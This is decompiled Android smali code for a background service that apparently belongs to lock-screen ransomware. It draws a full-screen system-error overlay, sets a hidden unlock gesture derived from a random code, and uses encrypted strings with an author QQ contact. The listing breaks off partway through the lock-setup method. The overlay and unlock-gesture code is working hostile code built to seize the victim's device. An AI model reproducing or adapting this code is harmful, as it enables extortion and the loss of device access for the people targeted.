.class public Lcom/cjk/s;
.super Landroid/app/Service;
.source "s.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/cjk/s$100000001;
    }
.end annotation


# instance fields
.field Lycorisradiata:Ljava/lang/String;

.field bah:Landroid/widget/TextView;

.field bahk:Ljava/lang/String;

.field cjk:Landroid/widget/TextView;

.field des:Lcom/cjk/DU;

.field dex:Lcom/cjk/DU;

.field editor:Landroid/content/SharedPreferences$Editor;

.field private gestureView:Lcom/cjk/qq1279525738/sssp;

.field private mFloatLayout:Landroid/view/View;

.field private mWindowManager:Landroid/view/WindowManager;

.field share:Landroid/content/SharedPreferences;

.field wb:Landroid/widget/TextView;

.field private wmParams:Landroid/view/WindowManager$LayoutParams;

.field 一:Ljava/lang/String;

.field 千:Ljava/lang/String;

.field 岸:Ljava/lang/String;

.field 年:Ljava/lang/String;

.field 开:Ljava/lang/String;

.field 彼:Ljava/lang/String;

.field 彼岸花开:I

.field 泉:Ljava/lang/String;

.field 照:Ljava/lang/String;

.field 花:Ljava/lang/String;

.field 黄:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 4

    .prologue
    .line 216
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Service;-><init>()V

    move-object v2, v0

    const-string v3, "by:\u5f7c\u5cb8\u82b1 qq:1279525738"

    iput-object v3, v2, Lcom/cjk/s;->bahk:Ljava/lang/String;

    move-object v2, v0

    move-object v3, v0

    iget-object v3, v3, Lcom/cjk/s;->bahk:Ljava/lang/String;

    invoke-static {v3}, Lcom/cjk/三生石畔彼岸花开;->getbah(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v2, Lcom/cjk/s;->Lycorisradiata:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$L1000000(Lcom/cjk/s;)Lcom/cjk/qq1279525738/sssp;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/cjk/s;->gestureView:Lcom/cjk/qq1279525738/sssp;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$L1000002(Lcom/cjk/s;)Landroid/view/WindowManager;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/cjk/s;->mWindowManager:Landroid/view/WindowManager;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$L1000003(Lcom/cjk/s;)Landroid/view/View;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/cjk/s;->mFloatLayout:Landroid/view/View;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$S1000000(Lcom/cjk/s;Lcom/cjk/qq1279525738/sssp;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lcom/cjk/s;->gestureView:Lcom/cjk/qq1279525738/sssp;

    return-void
.end method

.method static synthetic access$S1000002(Lcom/cjk/s;Landroid/view/WindowManager;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lcom/cjk/s;->mWindowManager:Landroid/view/WindowManager;

    return-void
.end method

.method static synthetic access$S1000003(Lcom/cjk/s;Landroid/view/View;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lcom/cjk/s;->mFloatLayout:Landroid/view/View;

    return-void
.end method

.method private c()V
    .locals 39
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 68
    move-object/from16 v2, p0

    move-object/from16 v32, v2

    new-instance v33, Landroid/view/WindowManager$LayoutParams;

    move-object/from16 v38, v33

    move-object/from16 v33, v38

    move-object/from16 v34, v38

    invoke-direct/range {v34 .. v34}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    move-object/from16 v0, v33

    move-object/from16 v1, v32

    iput-object v0, v1, Lcom/cjk/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    .line 69
    move-object/from16 v32, v2

    move-object/from16 v33, v2

    invoke-virtual/range {v33 .. v33}, Lcom/cjk/s;->getApplication()Landroid/app/Application;

    move-result-object v33

    move-object/from16 v34, v2

    invoke-virtual/range {v34 .. v34}, Lcom/cjk/s;->getApplication()Landroid/app/Application;

    move-result-object v34

    sget-object v34, Landroid/content/Context;->WINDOW_SERVICE:Ljava/lang/String;

    invoke-virtual/range {v33 .. v34}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v33

    check-cast v33, Landroid/view/WindowManager;

    move-object/from16 v0, v33

    move-object/from16 v1, v32

    iput-object v0, v1, Lcom/cjk/s;->mWindowManager:Landroid/view/WindowManager;

    .line 70
    move-object/from16 v32, v2

    move-object/from16 v0, v32

    iget-object v0, v0, Lcom/cjk/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    move-object/from16 v32, v0

    const/16 v33, 0x7da

    move/from16 v0, v33

    move-object/from16 v1, v32

    iput v0, v1, Landroid/view/WindowManager$LayoutParams;->type:I

    .line 71
    move-object/from16 v32, v2

    move-object/from16 v0, v32

    iget-object v0, v0, Lcom/cjk/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    move-object/from16 v32, v0

    const/16 v33, 0x1

    move/from16 v0, v33

    move-object/from16 v1, v32

    iput v0, v1, Landroid/view/WindowManager$LayoutParams;->format:I

    .line 72
    move-object/from16 v32, v2

    move-object/from16 v0, v32

    iget-object v0, v0, Lcom/cjk/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    move-object/from16 v32, v0

    const/16 v33, 0x500

    move/from16 v0, v33

    move-object/from16 v1, v32

    iput v0, v1, Landroid/view/WindowManager$LayoutParams;->flags:I

    .line 73
    move-object/from16 v32, v2

    move-object/from16 v0, v32

    iget-object v0, v0, Lcom/cjk/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    move-object/from16 v32, v0

    const/16 v33, 0x31

    move/from16 v0, v33

    move-object/from16 v1, v32

    iput v0, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 74
    move-object/from16 v32, v2

    move-object/from16 v0, v32

    iget-object v0, v0, Lcom/cjk/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    move-object/from16 v32, v0

    const/16 v33, 0x0

    move/from16 v0, v33

    move-object/from16 v1, v32

    iput v0, v1, Landroid/view/WindowManager$LayoutParams;->x:I

    .line 75
    move-object/from16 v32, v2

    move-object/from16 v0, v32

    iget-object v0, v0, Lcom/cjk/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    move-object/from16 v32, v0

    const/16 v33, 0x0

    move/from16 v0, v33

    move-object/from16 v1, v32

    iput v0, v1, Landroid/view/WindowManager$LayoutParams;->y:I

    .line 76
    move-object/from16 v32, v2

    move-object/from16 v0, v32

    iget-object v0, v0, Lcom/cjk/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    move-object/from16 v32, v0

    const/16 v33, -0x1

    move/from16 v0, v33

    move-object/from16 v1, v32

    iput v0, v1, Landroid/view/ViewGroup$LayoutParams;->width:I

    .line 77
    move-object/from16 v32, v2

    move-object/from16 v0, v32

    iget-object v0, v0, Lcom/cjk/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    move-object/from16 v32, v0

    const/16 v33, -0x1

    move/from16 v0, v33

    move-object/from16 v1, v32

    iput v0, v1, Landroid/view/ViewGroup$LayoutParams;->height:I

    .line 78
    move-object/from16 v32, v2

    invoke-virtual/range {v32 .. v32}, Lcom/cjk/s;->getApplication()Landroid/app/Application;

    move-result-object v32

    invoke-static/range {v32 .. v32}, Landroid/view/LayoutInflater;->from(Landroid/content/Context;)Landroid/view/LayoutInflater;

    move-result-object v32

    move-object/from16 v4, v32

    .line 79
    move-object/from16 v32, v2

    move-object/from16 v33, v4

    const v34, 0x7f030001

    const/16 v35, 0x0

    check-cast v35, Landroid/view/ViewGroup;

    invoke-virtual/range {v33 .. v35}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v33

    move-object/from16 v0, v33

    move-object/from16 v1, v32

    iput-object v0, v1, Lcom/cjk/s;->mFloatLayout:Landroid/view/View;

    .line 84
    move-object/from16 v32, v2

    move-object/from16 v0, v32

    iget-object v0, v0, Lcom/cjk/s;->mWindowManager:Landroid/view/WindowManager;

    move-object/from16 v32, v0

    move-object/from16 v33, v2

    move-object/from16 v0, v33

    iget-object v0, v0, Lcom/cjk/s;->mFloatLayout:Landroid/view/View;

    move-object/from16 v33, v0

    move-object/from16 v34, v2

    move-object/from16 v0, v34

    iget-object v0, v0, Lcom/cjk/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    move-object/from16 v34, v0

    invoke-interface/range {v32 .. v34}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 85
    move-object/from16 v32, v2

    move-object/from16 v33, v2

    move-object/from16 v0, v33

    iget-object v0, v0, Lcom/cjk/s;->mFloatLayout:Landroid/view/View;

    move-object/from16 v33, v0

    const v34, 0x7f0a0001

    invoke-virtual/range {v33 .. v34}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v33

    check-cast v33, Landroid/widget/TextView;

    move-object/from16 v0, v33

    move-object/from16 v1, v32

    iput-object v0, v1, Lcom/cjk/s;->wb:Landroid/widget/TextView;

    .line 86
    move-object/from16 v32, v2

    move-object/from16 v33, v2

    move-object/from16 v0, v33

    iget-object v0, v0, Lcom/cjk/s;->mFloatLayout:Landroid/view/View;

    move-object/from16 v33, v0

    const v34, 0x7f0a0002

    invoke-virtual/range {v33 .. v34}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v33

    check-cast v33, Landroid/widget/TextView;

    move-object/from16 v0, v33

    move-object/from16 v1, v32

    iput-object v0, v1, Lcom/cjk/s;->bah:Landroid/widget/TextView;

    .line 87
    move-object/from16 v32, v2

    move-object/from16 v33, v2

    move-object/from16 v0, v33

    iget-object v0, v0, Lcom/cjk/s;->mFloatLayout:Landroid/view/View;

    move-object/from16 v33, v0

    const v34, 0x7f0a0003

    invoke-virtual/range {v33 .. v34}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v33

    check-cast v33, Landroid/widget/TextView;

    move-object/from16 v0, v33

    move-object/from16 v1, v32

    iput-object v0, v1, Lcom/cjk/s;->cjk:Landroid/widget/TextView;

    .line 88
    move-object/from16 v32, v2

    move-object/from16 v33, v2

    move-object/from16 v0, v33

    iget-object v0, v0, Lcom/cjk/s;->mFloatLayout:Landroid/view/View;

    move-object/from16 v33, v0

    const/high16 v34, 0x7f0a0000

    invoke-virtual/range {v33 .. v34}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v33

    check-cast v33, Lcom/cjk/qq1279525738/sssp;

    move-object/from16 v0, v33

    move-object/from16 v1, v32

    iput-object v0, v1, Lcom/cjk/s;->gestureView:Lcom/cjk/qq1279525738/sssp;

    .line 89
    const-string v32, "483ae4e302f09bc71d0a6f730aa610a07f85a08e0aab415197d0f87a7176d42cd12e17f68eef0048f6c5c2b3a5e8737f29d5cb3ca1ac381f806c6e"

    move-object/from16 v5, v32

    .line 114
    move-object/from16 v32, v2

    invoke-virtual/range {v32 .. v32}, Lcom/cjk/s;->getResources()Landroid/content/res/Resources;

    move-result-object v32

    const v33, 0x7f060002

    invoke-virtual/range {v32 .. v33}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v32

    move-object/from16 v6, v32

    .line 115
    move-object/from16 v32, v6

    invoke-static/range {v32 .. v32}, Lcom/cjk/BAH;->getString(Ljava/io/InputStream;)Ljava/lang/String;

    move-result-object v32

    move-object/from16 v7, v32

    .line 116
    move-object/from16 v32, v7

    const-string v33, "\n"

    const-string v34, ""

    invoke-virtual/range {v32 .. v34}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v32

    move-object/from16 v8, v32

    .line 117
    move-object/from16 v32, v8

    invoke-static/range {v32 .. v32}, Lcom/cjk/M;->getsss(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v32

    move-object/from16 v9, v32

    .line 118
    move-object/from16 v32, v9

    move-object/from16 v33, v9

    const-string v34, "*"

    invoke-virtual/range {v33 .. v34}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v33

    const/16 v34, 0x1

    add-int/lit8 v33, v33, 0x1

    move-object/from16 v34, v9

    const-string v35, "/"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v34

    invoke-virtual/range {v32 .. v34}, Ljava/lang/String;->subSequence(II)Ljava/lang/CharSequence;

    move-result-object v32

    check-cast v32, Ljava/lang/String;

    move-object/from16 v10, v32

    .line 119
    move-object/from16 v32, v9

    move-object/from16 v33, v9

    const-string v34, "/"

    invoke-virtual/range {v33 .. v34}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v33

    const/16 v34, 0x1

    add-int/lit8 v33, v33, 0x1

    move-object/from16 v34, v9

    const-string v35, "+"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v34

    invoke-virtual/range {v32 .. v34}, Ljava/lang/String;->subSequence(II)Ljava/lang/CharSequence;

    move-result-object v32

    check-cast v32, Ljava/lang/String;

    move-object/from16 v11, v32

    .line 120
    move-object/from16 v32, v9

    move-object/from16 v33, v9

    const-string v34, "+"

    invoke-virtual/range {v33 .. v34}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v33

    const/16 v34, 0x1

    add-int/lit8 v33, v33, 0x1

    move-object/from16 v34, v9

    const-string v35, "-"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v34

    invoke-virtual/range {v32 .. v34}, Ljava/lang/String;->subSequence(II)Ljava/lang/CharSequence;

    move-result-object v32

    check-cast v32, Ljava/lang/String;

    move-object/from16 v12, v32

    .line 121
    move-object/from16 v32, v9

    move-object/from16 v33, v9

    const-string v34, "-"

    invoke-virtual/range {v33 .. v34}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v33

    const/16 v34, 0x1

    add-int/lit8 v33, v33, 0x1

    move-object/from16 v34, v9

    invoke-virtual/range {v34 .. v34}, Ljava/lang/String;->length()I

    move-result v34

    invoke-virtual/range {v32 .. v34}, Ljava/lang/String;->subSequence(II)Ljava/lang/CharSequence;

    move-result-object v32

    check-cast v32, Ljava/lang/String;

    move-object/from16 v13, v32

    .line 122
    move-object/from16 v32, v10

    invoke-static/range {v32 .. v32}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v32

    invoke-virtual/range {v32 .. v32}, Ljava/lang/Integer;->intValue()I

    move-result v32

    move/from16 v14, v32

    .line 123
    move-object/from16 v32, v11

    invoke-static/range {v32 .. v32}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v32

    invoke-virtual/range {v32 .. v32}, Ljava/lang/Integer;->intValue()I

    move-result v32

    move/from16 v15, v32

    .line 124
    move-object/from16 v32, v12

    invoke-static/range {v32 .. v32}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v32

    invoke-virtual/range {v32 .. v32}, Ljava/lang/Integer;->intValue()I

    move-result v32

    move/from16 v16, v32

    .line 125
    move-object/from16 v32, v13

    invoke-static/range {v32 .. v32}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v32

    invoke-virtual/range {v32 .. v32}, Ljava/lang/Integer;->intValue()I

    move-result v32

    move/from16 v17, v32

    .line 127
    move-object/from16 v32, v2

    :try_start_0
    invoke-static {}, Ljava/lang/Math;->random()D

    move-result-wide v33

    move-object/from16 v35, v2

    move-object/from16 v0, v35

    iget-object v0, v0, Lcom/cjk/s;->des:Lcom/cjk/DU;

    move-object/from16 v35, v0

    const-string v36, "3cc14af1e8e62628"

    invoke-virtual/range {v35 .. v36}, Lcom/cjk/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    invoke-static/range {v35 .. v35}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v35

    invoke-virtual/range {v35 .. v35}, Ljava/lang/Integer;->intValue()I

    move-result v35

    move/from16 v0, v35

    int-to-double v0, v0

    move-wide/from16 v35, v0

    mul-double v33, v33, v35

    move-wide/from16 v0, v33

    double-to-int v0, v0

    move/from16 v33, v0

    move/from16 v0, v33

    move-object/from16 v1, v32

    iput v0, v1, Lcom/cjk/s;->彼岸花开:I

    move-object/from16 v32, v2

    move-object/from16 v0, v32

    iget-object v0, v0, Lcom/cjk/s;->wb:Landroid/widget/TextView;

    move-object/from16 v32, v0

    new-instance v33, Ljava/lang/StringBuffer;

    move-object/from16 v38, v33

    move-object/from16 v33, v38

    move-object/from16 v34, v38

    invoke-direct/range {v34 .. v34}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v34, Ljava/lang/StringBuffer;

    move-object/from16 v38, v34

    move-object/from16 v34, v38

    move-object/from16 v35, v38

    invoke-direct/range {v35 .. v35}, Ljava/lang/StringBuffer;-><init>()V

    move-object/from16 v35, v2

    move-object/from16 v0, v35

    iget-object v0, v0, Lcom/cjk/s;->des:Lcom/cjk/DU;

    move-object/from16 v35, v0

    new-instance v36, Ljava/lang/StringBuffer;

    move-object/from16 v38, v36

    move-object/from16 v36, v38

    move-object/from16 v37, v38

    invoke-direct/range {v37 .. v37}, Ljava/lang/StringBuffer;-><init>()V

    move-object/from16 v37, v2

    move-object/from16 v0, v37

    iget-object v0, v0, Lcom/cjk/s;->Lycorisradiata:Ljava/lang/String;

    move-object/from16 v37, v0

    invoke-virtual/range {v36 .. v37}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v36

    const-string v37, "7beba1e67a9fe3ad206117ad19e14d01"

    invoke-virtual/range {v36 .. v37}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v36

    invoke-virtual/range {v36 .. v36}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v36

    invoke-static/range {v36 .. v36}, Lcom/cjk/DU;->getbah(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v36

    invoke-virtual/range {v35 .. v36}, Lcom/cjk/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v34

    move-object/from16 v35, v2

    move-object/from16 v0, v35

    iget v0, v0, Lcom/cjk/s;->彼岸花开:I

    move/from16 v35, v0

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v34

    invoke-virtual/range {v33 .. v34}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v33

    move-object/from16 v34, v2

    move-object/from16 v0, v34

    iget-object v0, v0, Lcom/cjk/s;->des:Lcom/cjk/DU;

    move-object/from16 v34, v0

    const-string v35, "8a5718abb4173881"

    invoke-virtual/range {v34 .. v35}, Lcom/cjk/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    invoke-virtual/range {v33 .. v34}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v33

    invoke-virtual/range {v33 .. v33}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v33

    invoke-virtual/range {v32 .. v33}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 128
    :goto_0
    new-instance v32, Ljava/lang/StringBuffer;

    move-object/from16 v38, v32

    move-object/from16 v32, v38

    move-object/from16 v33, v38

    new-instance v34, Ljava/lang/StringBuffer;

    move-object/from16 v38, v34

    move-object/from16 v34, v38

    move-object/from16 v35, v38

    invoke-direct/range {v35 .. v35}, Ljava/lang/StringBuffer;-><init>()V

    move-object/from16 v35, v2

    move-object/from16 v0, v35

    iget v0, v0, Lcom/cjk/s;->彼岸花开:I

    move/from16 v35, v0

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    move-result-object v34

    const-string v35, ""

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v34

    invoke-direct/range {v33 .. v34}, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V

    move-object/from16 v18, v32

    .line 129
    new-instance v32, Ljava/lang/StringBuffer;

    move-object/from16 v38, v32

    move-object/from16 v32, v38

    move-object/from16 v33, v38

    invoke-direct/range {v33 .. v33}, Ljava/lang/StringBuffer;-><init>()V

    move-object/from16 v33, v18

    invoke-virtual/range {v33 .. v33}, Ljava/lang/StringBuffer;->reverse()Ljava/lang/StringBuffer;

    move-result-object v33

    invoke-virtual/range {v32 .. v33}, Ljava/lang/StringBuffer;->append(Ljava/lang/Object;)Ljava/lang/StringBuffer;

    move-result-object v32

    const-string v33, ""

    invoke-virtual/range {v32 .. v33}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v32

    invoke-virtual/range {v32 .. v32}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v32

    invoke-static/range {v32 .. v32}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v32

    invoke-virtual/range {v32 .. v32}, Ljava/lang/Integer;->intValue()I

    move-result v32

    move/from16 v19, v32

    .line 133
    move/from16 v32, v19

    move/from16 v33, v14

    mul-int v32, v32, v33

    move/from16 v33, v15

    div-int v32, v32, v33

    move/from16 v33, v16

    add-int v32, v32, v33

    move/from16 v33, v17

    sub-int v32, v32, v33

    move/from16 v20, v32

    .line 134
    new-instance v32, Ljava/lang/StringBuffer;

    move-object/from16 v38, v32

    move-object/from16 v32, v38

    move-object/from16 v33, v38

    invoke-direct/range {v33 .. v33}, Ljava/lang/StringBuffer;-><init>()V

    move/from16 v33, v20

    invoke-virtual/range {v32 .. v33}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    move-result-object v32

    const-string v33, ""

    invoke-virtual/range {v32 .. v33}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v32

    invoke-virtual/range {v32 .. v32}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v32

    move-object/from16 v21, v32

    .line 135
    move-object/from16 v32, v21

    const-string v33, "9"

    const-string v34, ""

    invoke-virtual/range {v32 .. v34}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v32

    move-object/from16 v22, v32

    .line 136
    new-instance v32, Ljava/lang/StringBuffer;

    move-object/from16 v38, v32

    move-object/from16 v32, v38

    move-object/from16 v33, v38

    new-instance v34, Ljava/lang/StringBuffer;

    move-object/from16 v38, v34

    move-object/from16 v34, v38

    move-object/from16 v35, v38

    move-object/from16 v36, v22

    invoke-direct/range {v35 .. v36}, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuffer;->reverse()Ljava/lang/StringBuffer;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v34

    const-string v35, "(?s)(.)(?=.*\\1)"

    const-string v36, ""

    invoke-virtual/range {v34 .. v36}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    invoke-direct/range {v33 .. v34}, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V

    invoke-virtual/range {v32 .. v32}, Ljava/lang/StringBuffer;->reverse()Ljava/lang/StringBuffer;

    move-result-object v32

    invoke-virtual/range {v32 .. v32}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v32

    move-object/from16 v23, v32

    .line 137
    move-object/from16 v32, v23

    invoke-virtual/range {v32 .. v32}, Ljava/lang/String;->length()I

    move-result v32

    move/from16 v0, v32

    new-array v0, v0, [I

    move-object/from16 v32, v0

    move-object/from16 v24, v32

    .line 138
    move-object/from16 v32, v2

    move-object/from16 v0, v32

    iget-object v0, v0, Lcom/cjk/s;->gestureView:Lcom/cjk/qq1279525738/sssp;

    move-object/from16 v32, v0

    move-object/from16 v33, v24

    invoke-virtual/range {v32 .. v33}, Lcom/cjk/qq1279525738/sssp;->setCorrectGesture([I)V

    .line 139
    const/16 v32, 0x0

    move/from16 v25, v32

    :goto_1
    move/from16 v32, v25

    move-object/from16 v33, v23

    invoke-virtual/range {v33 .. v33}, Ljava/lang/String;->length()I

    move-result v33

    move/from16 v0, v32

    move/from16 v1, v33

    if-lt v0, v1, :cond_0

    .line 143
    move-object/from16 v32, v2

    move-object/from16 v0, v32

    iget-object v0, v0, Lcom/cjk/s;->gestureView:Lcom/cjk/qq1279525738/sssp;

    move-object/from16 v32, v0

    new-instance v33, Lcom/cjk/s$100000001;

    move-object/from16 v38, v33

    move-object/from16 v33, v38

    move-object/from16 v34, v38

    move-object/from16 v35, v2

    invoke-direct/range {v34 .. v35}, Lcom/cjk/s$100000001;-><init>(Lcom/cjk/s;)V

    invoke-virtual/range {v32 .. v33}, Lcom/cjk/qq1279525738/sssp;->setOnGestureEventListener(Lcom/cjk/qq1279525738/sssp$OnGestureEventListener;)V

    .line 200
    move-object/from16 v32, v2

    :try_start_1
    invoke-virtual/range {v32 .. v32}, Lcom/cjk/s;->getResources()Landroid/content/res/Resources;

    move-result-object v32

    const/high16 v33, 0x7f060000

    invoke-virtual/range {v32 .. v33}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v32

    move-object/from16 v25, v32

    .line 201
    move-object/from16 v32, v25

    invoke-static/range {v32 .. v32}, Lcom/cjk/BAH;->getString(Ljava/io/InputStream;)Ljava/lang/String;

    move-result-object v32

    move-object/from16 v26, v32

    .line 202
    move-object/from16 v32, v26

    const-string v33, "\n"

    const-string v34, ""

    invoke-virtual/range {v32 .. v34}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v32

    move-object/from16 v27, v32

    .line 203
    move-object/from16 v32, v27

    invoke-static/range {v32 .. v32}, Lcom/cjk/M;->getsss(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v32

    move-object/from16 v28, v32

    .line 204
    move-object/from16 v32, v2

    move-object/from16 v0, v32

    iget-object v0, v0, Lcom/cjk/s;->bah:Landroid/widget/TextView;

    move-object/from16 v32, v0

    move-object/from16 v33, v28

    invoke-virtual/range {v32 .. v33}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 208
    new-instance v32, Ljava/lang/StringBuffer;

    move-object/from16 v38, v32

    move-object/from16 v32, v38

    move-object/from16 v33, v38

    invoke-direct/range {v33 .. v33}, Ljava/lang/StringBuffer;-><init>()V

    move-object/from16 v33, v2

    move-object/from16 v0, v33

    iget-object v0, v0, Lcom/cjk/s;->Lycorisradiata:Ljava/lang/String;

    move-object/from16 v33, v0

    invoke-virtual/range {v32 .. v33}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v32

    const-string v33, "be40eb0831e79a5bdadbe959a2569c6f36baef6492dbfdd2421285f5ab7a104f"

    invoke-virtual/range {v32 .. v33}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v32

    invoke-virtual/range {v32 .. v32}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v32

    move-object/from16 v29, v32

    .line 209
    move-object/from16 v32, v29

    invoke-static/range {v32 .. v32}, Lcom/cjk/DU;->getbah(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v32

    move-object/from16 v30, v32

    .line 211
    move-object/from16 v32, v2

    move-object/from16 v0, v32

    iget-object v0, v0, Lcom/cjk/s;->cjk:Landroid/widget/TextView;

    move-object/from16 v32, v0

    move-object/from16 v33, v2

    move-object/from16 v0, v33

    iget-object v0, v0, Lcom/cjk/s;->des:Lcom/cjk/DU;

    move-object/from16 v33, v0

    move-object/from16 v34, v30

    invoke-virtual/range {v33 .. v34}, Lcom/cjk/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v33

    invoke-virtual/range {v32 .. v33}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :goto_2
    return-void

    .line 127
    :catch_0
    move-exception v32

    move-object/from16 v18, v32

    goto/16 :goto_0

    .line 141
    :cond_0
    move-object/from16 v32, v24

    move/from16 v33, v25

    move-object/from16 v34, v23

    move/from16 v35, v25

    invoke-virtual/range {v34 .. v35}, Ljava/lang/String;->charAt(I)C

    move-result v34

